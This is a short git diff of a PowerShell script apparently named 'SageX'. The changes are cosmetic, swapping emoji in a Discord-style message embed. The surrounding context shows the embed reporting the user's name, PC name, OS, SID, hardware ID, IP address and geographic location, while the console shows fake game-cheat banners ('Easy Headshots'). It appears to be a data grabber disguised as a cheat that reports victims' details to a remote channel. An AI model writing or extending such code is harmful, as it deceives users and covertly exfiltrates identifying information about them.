@@ -52,18 +52,18 @@ try {
 
 # Create embed
 $embed = @{
-    title = "🔔 SageX Executed"
+    title = "<:Dead:1346705076626002033> SageX Executed"
     color = 16711680
     timestamp = (Get-Date).ToString("o")
     fields = @(
-        @{ name = "👤 User"; value = $user; inline = $true },
-        @{ name = "🖥️ PC Name"; value = $pcName; inline = $true },
-        @{ name = "🛠️ OS"; value = $os; inline = $false },
-        @{ name = "🆔 SID"; value = $sid; inline = $false },
-        @{ name = "🔑 HWID (hashed)"; value = $hashedHWID; inline = $false },
-        @{ name = "🌐 IP Address"; value = $ip; inline = $true },
-        @{ name = "📍 Location"; value = "$city, $region, $country"; inline = $true },
-        @{ name = "🕒 Time"; value = $time; inline = $false }
+        @{ name = "<a:trick_supreme:1346694280386707466> User"; value = $user; inline = $true },
+        @{ name = "<a:trick_supreme:1346694193157767269> PC Name"; value = $pcName; inline = $true },
+        @{ name = "<:windows:904792336058425346> OS"; value = $os; inline = $false },
+        @{ name = "<:trick_supreme:1346446598791757884> SID"; value = $sid; inline = $false },
+        @{ name = "<:trick_supreme:1346446598791757884> HWID (hashed)"; value = $hashedHWID; inline = $false },
+        @{ name = "<:trick_supreme:1346446598791757884> IP Address"; value = $ip; inline = $true },
+        @{ name = "<:trick_supreme:1346446598791757884> Location"; value = "$city, $region, $country"; inline = $true },
+        @{ name = "<a:726747821373653072:1346705048947785822> Time"; value = $time; inline = $false }
     )
 }
 
@@ -106,7 +106,7 @@ $msgLines = @(
     "[+] Drag Assist Enabled - Easy Headshots",
     "[+] Low Input Lag Mode ON",
     "[+] Hold LMB for Auto Drag Support",
-    "[+] Press F8 to Toggle ON/OFF"
+    "[*] Press F8 to Toggle ON/OFF"
 )
 $msgLines | ForEach-Object {
     Write-Host $_ -ForegroundColor Red
